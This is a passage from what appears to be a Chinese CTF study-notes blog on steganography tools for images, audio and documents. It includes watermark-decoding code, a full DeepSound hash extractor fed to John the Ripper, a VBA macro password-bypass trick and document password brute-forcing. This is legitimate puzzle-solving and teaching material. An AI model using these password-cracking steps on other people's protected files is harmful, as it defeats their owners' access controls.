盲水印</h2><p>水印又分为单图水印和双图水印</p><p>单图水印是指只需要一张图片就能提取出隐藏的信息，双图需要两张图片（一般是原图和加密后的图片，通常两张图片看上去是一样的）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//blindwatermark双图盲水印<br>python2 bwm.py encode 原图.png 水印图.png 有盲水印的图.png<br>python2 bwm.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png<br>python3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png<br>python3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png --oldseed<br></code></pre></td></tr></table></figure><p>还有一种特殊的盲水印：<code>频域盲水印</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><br>ALPHA = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_parser</span>():<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&#x27;--original&#x27;</span>, dest=<span class="hljs-string">&#x27;ori&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--image&#x27;</span>, dest=<span class="hljs-string">&#x27;img&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--result&#x27;</span>, dest=<span class="hljs-string">&#x27;res&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--alpha&#x27;</span>, dest=<span class="hljs-string">&#x27;alpha&#x27;</span>, default=ALPHA)<br>    <span class="hljs-keyword">return</span> parser<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = build_parser()<br>    options = parser.parse_args()<br>    ori = options.ori<br>    img = options.img<br>    res = options.res<br>    alpha = options.alpha<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(ori):<br>        parser.error(<span class="hljs-string">&quot;original image %s does not exist.&quot;</span> % ori)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(img):<br>        parser.error(<span class="hljs-string">&quot;image %s does not exist.&quot;</span> % img)<br>    decode(ori, img, res, alpha)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">ori_path, img_path, res_path, alpha</span>):<br>    ori = cv2.imread(ori_path)<br>    img = cv2.imread(img_path)<br>    ori_f = np.fft.fft2(ori)<br>    img_f = np.fft.fft2(img)<br>    height, width = ori.shape[<span class="hljs-number">0</span>], ori.shape[<span class="hljs-number">1</span>]<br>    watermark = (ori_f - img_f) / alpha<br>    watermark = np.real(watermark)<br>    res = np.zeros(watermark.shape)<br>    random.seed(height + width)<br>    x = <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>)<br>    y = <span class="hljs-built_in">range</span>(width)<br>    random.shuffle(x)<br>    random.shuffle(y)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height / <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            res[x[i]][y[j]] = watermark[i][j]<br>    cv2.imwrite(res_path, res, [<span class="hljs-built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="hljs-number">100</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>使用<br><code>python pinyubwm.py --original 1.png --image 2.png --result out.png</code></p><h2 id="0x09-gnuplot"><a href="#0x09-gnuplot" class="headerlink" title="0x09 gnuplot"></a>0x09 gnuplot</h2><p><code>gnuplot</code>可以把坐标画出来</p><p>坐标格式：<code>number number</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">plot &quot;1.txt&quot;<br></code></pre></td></tr></table></figure><h2 id="0x10-拼图"><a href="#0x10-拼图" class="headerlink" title="0x10 拼图"></a>0x10 拼图</h2><p><code>montage+gaps</code>可以将小图片还原成大图片</p><p>先用<code>montage</code>组合图片</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">montage input_file -tile 8X6 -geometry +0+0 output_file<br></code></pre></td></tr></table></figure><p><code>input_file</code>：可以一张一张指定，也能使用正则匹配(<code>*.png</code>)<br><code>-geometry +0+0</code>：使图片之间没有间隙<br><code>-tile 8X6</code>：以8行6列排列<br><code>output_file</code>：输出文件</p><p><code>gaps</code>用来还原<code>montage</code>命令创建的乱序图像</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">gaps --image=out.jpg --generations=50 --population=120 --size=50<br><br>--image            指向拼图的路径<br>--size            拼图块的像素尺寸（如果不能明确提供--size的参数，拼图块尺寸将自适应调整）<br>--generations    遗传算法的代的数量<br>--population    个体数量<br>--verbose        每一代训练结束后展示最佳结果<br>--save            将拼图还原为图像<br></code></pre></td></tr></table></figure><h2 id="0x11-pngcheck"><a href="#0x11-pngcheck" class="headerlink" title="0x11 pngcheck"></a>0x11 pngcheck</h2><p>windows工具，用来检查IDAT块</p><h2 id="0x12-webp"><a href="#0x12-webp" class="headerlink" title="0x12 webp"></a>0x12 webp</h2><blockquote><p>webp图片是一种同时提供了有损压缩与无损压缩（可逆压缩）的图片文件格式。webp最初在2010年发布，目标是减少文件大小，但达到和JPEG格式相同的图片质量，希望能够减少图片在网络上的发送时间。</p></blockquote><p><a href="https://developers.google.com/speed/webp/docs/using?hl=zh-cn">webp工具官方文档</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">cwebp - 将图片文件压缩为 WebP 文件<br>cwebp 1.png -o 2.webp<br><br>dwebp - 将 WebP 文件解压缩到图片文件<br>dwebp 1.webp -o 2.png<br><br>gif2webp - 将 GIF 图片转换为 WebP 格式<br>gif2webp 1.gif -o 2.webp<br><br>vwebp - 解压缩 WebP 文件，然后在窗口中显示该文件<br>vwebp 1.webp<br><br>webpinfo - 输出 WebP 文件的区块级结构以及基本完整性检查<br>webpinfo 1.webp<br></code></pre></td></tr></table></figure><h2 id="0x13-stegpy-可需要passwd"><a href="#0x13-stegpy-可需要passwd" class="headerlink" title="0x13 stegpy(可需要passwd)"></a>0x13 stegpy(可需要passwd)</h2><p>加密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">stegpy &#x27;hello_world&#x27; image.png<br>stegpy &quot;hello_world&quot; image.png -p   //需要密码<br></code></pre></td></tr></table></figure><p>解密</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">stegpy _image.png<br>stegpy _image.png -p  //需要密码<br></code></pre></td></tr></table></figure><h2 id="0x14-二维码"><a href="#0x14-二维码" class="headerlink" title="0x14 二维码"></a>0x14 二维码</h2><p>二维码类的题目需要对二维码的生成原理有深入了解</p><p><a href="https://li-yang.cn/?p=627">CTF中二维码题目及答题技巧总结（一）</a></p><p>可能有以下考点</p><p>1：修复二维码</p><p>可能给了一张常规的二维码，但是没有定位符，就需要自己画上去，或者一个大二维码打乱成数个小的二维码，需要还原</p><p>2：与数织结合</p><p>例如祥云杯的<code>shuffle_code</code></p><p>3：奇奇怪怪的变种二维码</p><p>推荐<code>cortexScan</code>和中国编码识别</p><h1 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h1><h2 id="0x01-MP3stego-需要passwd"><a href="#0x01-MP3stego-需要passwd" class="headerlink" title="0x01 MP3stego(需要passwd)"></a>0x01 MP3stego(需要passwd)</h2><p>针对<code>.mp3</code>文件隐写</p><p><code>.\Decode.exe -X -P [password] [stego_mp3]</code></p><p>会在当前目录下生成一个txt文件</p><h2 id="0x02-steghide-可需要passwd"><a href="#0x02-steghide-可需要passwd" class="headerlink" title="0x02 steghide(可需要passwd)"></a>0x02 steghide(可需要passwd)</h2><p>上面提到过的steghide，也能用于音频隐写</p><h2 id="0x03-Audacity"><a href="#0x03-Audacity" class="headerlink" title="0x03 Audacity"></a>0x03 Audacity</h2><p>神器</p><p>1.摩斯密码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/yinpin-1.png"></p><p>2.频谱图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/yinpin-2.png"></p><p>3.反向音频</p><p>4.波形</p><h2 id="0x04-minimodem"><a href="#0x04-minimodem" class="headerlink" title="0x04 minimodem"></a>0x04 minimodem</h2><p>分析wav文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">minimodem --rx -f encoded.wav 1200<br></code></pre></td></tr></table></figure><p><code>--rx</code>：rx或者r均可，为指定读取模式<br><code>-f</code>：读取文件<br><code>1200</code>：为bell202 bps对应参数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">//baudmode参考<br>&#123;any floating point value N&#125; : Bell202-style at N bps −−ascii<br><br>1200 : Bell202 1200 bps −−ascii<br><br>300 : Bell103 300 bps −−ascii<br><br>rtty : RTTY 45.45 bps −−baudot −−stopbits 1.5<br><br>tdd : TTY/TDD 45.45 bps −−baudot −−stopbits 2.0<br><br>same : SAME 520.83 bps −−startbits 0 −−stopbits 0 −−sync-byte 0xAB NOAA Specific Area Message Encoding (SAME) protocol<br><br>callerid : Bell202 1200 bps Caller-ID (MDMF or SDMF) protocol<br><br>uic-train : UIC-751-3 600 bps train-to-ground message protocol<br><br>uic-ground : UIC-751-3 600 bps ground-to-train message protocol<br></code></pre></td></tr></table></figure><p><a href="http://www.whence.com/minimodem/minimodem.1.html">官方手册</a></p><h2 id="0x05-DeepSound-需要passwd"><a href="#0x05-DeepSound-需要passwd" class="headerlink" title="0x05 DeepSound(需要passwd)"></a>0x05 DeepSound(需要passwd)</h2><p>windows软件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/DeepSound.jpg"></p><p>部分题目的密码需要用<a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py">deepsound2john.py</a>爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">deepsound2john extracts password hashes from audio files containing encrypted</span><br><span class="hljs-string">data steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).</span><br><span class="hljs-string"></span><br><span class="hljs-string">This method is known to work with files created by DeepSound 2.0.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Input files should be in .wav format. Hashes can be recovered from audio files</span><br><span class="hljs-string">even after conversion from other formats, e.g.,</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ffmpeg -i input output.wav</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    python3 deepsound2john.py carrier.wav &gt; hashes.txt</span><br><span class="hljs-string">    john hashes.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">This software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, and</span><br><span class="hljs-string">it is hereby released to the general public under the following terms:</span><br><span class="hljs-string">Redistribution and use in source and binary forms, with or without</span><br><span class="hljs-string">modification, are permitted.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> textwrap<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_low</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[::<span class="hljs-number">2</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_normal</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">4</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span> | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">15</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_high</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">8</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>     | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span> \<br>             | (buf[i + <span class="hljs-number">4</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span> | (buf[i + <span class="hljs-number">6</span>] &amp; <span class="hljs-number">3</span>))<br>  <span class="hljs-keyword">return</span> out<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_magic</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-comment"># This is a more efficient way of testing for the `DSCF` magic header without</span><br>  <span class="hljs-comment"># decoding the whole buffer</span><br>  <span class="hljs-keyword">return</span> (buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">68</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">2</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">68</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">83</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">6</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">83</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">67</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">67</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &amp; <span class="hljs-number">15</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_wave</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;RIFF&#x27;</span> <span class="hljs-keyword">and</span> buf[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>] == <span class="hljs-string">b&#x27;WAVE&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_deepsound_file</span>(<span class="hljs-params">f</span>):<br>  bname = os.path.basename(f.name)<br>  logger = logging.getLogger(bname)<br><br>  <span class="hljs-comment"># Check if it&#x27;s a .wav file</span><br>  buf = f.read(<span class="hljs-number">12</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_wave(buf):<br>    <span class="hljs-keyword">global</span> convert_warn<br>    logger.error(<span class="hljs-string">&#x27;file not in .wav format&#x27;</span>)<br>    convert_warn = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span><br>  f.seek(<span class="hljs-number">0</span>, os.SEEK_SET)<br><br>  <span class="hljs-comment"># Scan for the marker...</span><br>  hdrsz = <span class="hljs-number">104</span><br>  hdr = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    off = f.tell()<br>    buf = f.read(hdrsz)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf) &lt; hdrsz: <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> is_magic(buf):<br>          hdr = decode_data_normal(buf)<br>          logger.info(<span class="hljs-string">&#x27;found DeepSound header at offset %i&#x27;</span>, off)<br>          <span class="hljs-keyword">break</span><br><br>    f.seek(-hdrsz + <span class="hljs-number">1</span>, os.SEEK_CUR)<br><br>  <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    logger.warn(<span class="hljs-string">&#x27;does not appear to be a DeepSound file&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br><br>  <span class="hljs-comment"># Check some header fields</span><br>  mode = hdr[<span class="hljs-number">4</span>]<br>  encrypted = hdr[<span class="hljs-number">5</span>]<br><br>  modes = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;low&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;normal&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;high&#x27;</span>&#125;<br>  <span class="hljs-keyword">if</span> mode <span class="hljs-keyword">in</span> modes:<br>    logger.info(<span class="hljs-string">&#x27;data is encoded in %s-quality mode&#x27;</span>, modes[mode])<br>  <span class="hljs-keyword">else</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected data encoding mode %i&#x27;</span>, modes[mode])<br>    <span class="hljs-keyword">return</span><br><br>  <span class="hljs-keyword">if</span> encrypted == <span class="hljs-number">0</span>:<br>    logger.warn(<span class="hljs-string">&#x27;file is not encrypted&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br>  <span class="hljs-keyword">elif</span> encrypted != <span class="hljs-number">1</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected encryption flag %i&#x27;</span>, encrypted)<br>    <span class="hljs-keyword">return</span><br><br>  sha1 = hdr[<span class="hljs-number">6</span>:<span class="hljs-number">6</span>+<span class="hljs-number">20</span>]<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s:$dynamic_1529$%s&#x27;</span> % (bname, sha1.<span class="hljs-built_in">hex</span>()))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  <span class="hljs-keyword">import</span> argparse<br><br>  parser = argparse.ArgumentParser()<br>  parser.add_argument(<span class="hljs-string">&#x27;--verbose&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>  parser.add_argument(<span class="hljs-string">&#x27;files&#x27;</span>, nargs=<span class="hljs-string">&#x27;+&#x27;</span>, metavar=<span class="hljs-string">&#x27;file&#x27;</span>,<br>    <span class="hljs-built_in">type</span>=argparse.FileType(<span class="hljs-string">&#x27;rb&#x27;</span>, bufsize=<span class="hljs-number">4096</span>))<br>  args = parser.parse_args()<br><br>  <span class="hljs-keyword">if</span> args.verbose:<br>    logging.basicConfig(level=logging.INFO)<br>  <span class="hljs-keyword">else</span>:<br>    logging.basicConfig(level=logging.WARN)<br><br>  convert_warn = <span class="hljs-literal">False</span><br><br>  <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> args.files:<br>    process_deepsound_file(f)<br><br>  <span class="hljs-keyword">if</span> convert_warn:<br>    <span class="hljs-built_in">print</span>(textwrap.dedent(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    Some files were not in .wav format. Try converting them to .wav</span><br><span class="hljs-string">    and try again. You can use: ffmpeg -i input output.wav</span><br><span class="hljs-string">    ---------------------------------------------------------------</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.rstrip()), file=sys.stderr)<br></code></pre></td></tr></table></figure><p>用法</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">python3 deepsound2john.py carrier.wav &gt; hashes.txt<br>john hashes.txt<br></code></pre></td></tr></table></figure><h2 id="0x06-dtmf"><a href="#0x06-dtmf" class="headerlink" title="0x06 dtmf"></a>0x06 dtmf</h2><blockquote><p>双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。<br>双音多频的拨号键盘是4×4的矩阵，每一行代表一个高频，每一列代表一个低频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。<br>（来自维基百科）</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/dtmf.jpg"></p><p>命令识别：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">dtmf2num xxx.wav<br></code></pre></td></tr></table></figure><h2 id="0x07-SSTV"><a href="#0x07-SSTV" class="headerlink" title="0x07 SSTV"></a>0x07 SSTV</h2><p>慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片</p><p>可以通过<code>Robot36</code>app或者<a href="https://github.com/colaclanth/sstv">SSTV Decoder</a>识别</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sstv -d audio_file.wav -o result.png<br></code></pre></td></tr></table></figure><h2 id="0x08-openpuff-需要passwd"><a href="#0x08-openpuff-需要passwd" class="headerlink" title="0x08 openpuff(需要passwd)"></a>0x08 openpuff(需要passwd)</h2><p>windows软件</p><p>需要三个8位密码解密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/openpuff.png"></p><h1 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h1><h2 id="0x01-VBA宏密码破解"><a href="#0x01-VBA宏密码破解" class="headerlink" title="0x01 VBA宏密码破解"></a>0x01 VBA宏密码破解</h2><p>将<code>CMG=</code>替换为<code>CMG.</code>，<code>DPB=</code>替换为<code>DPB.</code> ，<code>GC=</code>替换为<code>GC.</code></p><p><code>alt+F11</code>打开vba编辑器</p><h2 id="0x02-字体隐藏"><a href="#0x02-字体隐藏" class="headerlink" title="0x02 字体隐藏"></a>0x02 字体隐藏</h2><p>在字体的效果中勾选隐藏选项即可隐藏字符(或者采用了白色字体)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/word-1.png"></p><h2 id="0x03-图片隐藏"><a href="#0x03-图片隐藏" class="headerlink" title="0x03 图片隐藏"></a>0x03 图片隐藏</h2><p>把后缀改为<code>zip</code>解压，在<code>media</code>目录下可以看到文档的所有图片(不排除故意放在其他目录中)</p><h2 id="0x04-pdf文件"><a href="#0x04-pdf文件" class="headerlink" title="0x04 pdf文件"></a>0x04 pdf文件</h2><p>使用福昕编辑器等即可编辑，或者先转换成<code>docx</code></p><h2 id="0x05-wbstego4"><a href="#0x05-wbstego4" class="headerlink" title="0x05 wbstego4"></a>0x05 wbstego4</h2><p>适用于pdf隐写</p><h2 id="0x06-密码爆破"><a href="#0x06-密码爆破" class="headerlink" title="0x06 密码爆破"></a>0x06 密码爆破</h2><p>可以用<code>passware kit</code>等工具爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/word-2.png"></p><h2 id="0x07-odttf转ttf"><a href="#0x07-odttf转ttf" class="headerlink" title="0x07 odttf转ttf"></a>0x07 